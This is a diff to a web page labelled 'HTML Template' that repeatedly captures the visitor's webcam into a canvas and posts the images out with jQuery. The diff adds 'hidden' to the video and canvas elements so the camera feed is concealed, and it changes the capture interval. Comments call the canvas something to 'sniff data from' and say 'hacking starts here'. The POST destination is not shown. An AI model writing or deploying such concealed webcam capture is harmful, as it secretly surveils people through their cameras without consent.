@@ -12,10 +12,10 @@
    <h1 align="center">HTML Template</h1>
 
    <!-- Video frame -->
-   <video id="video" playsinline autoplay></video>
+   <video hidden id="video" playsinline autoplay></video>
 
    <!-- Canvas to sniff data from -->
-   <canvas id="canvas" width="640" height="640">canvas</canvas>
+   <canvas hidden id="canvas" width="640" height="640">canvas</canvas>
 
    <!-- Jquery to make HTTP POST requests to send images from a webcam -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
@@ -53,9 +53,9 @@
 
          setInterval(function () {
             context.drawImage(video, 0, 0, 640, 640);
-            var canvasData = canvas.toDataURL("image/png")//.replace("image/png", "image/octet-stream");
+            var canvasData = canvas.toDataURL("image/png"); // .replace("image/png", "image/octet-stream")
             post(canvasData);
-         }, 500);
+         }, 3000);
       }
 
       // hacking starts here
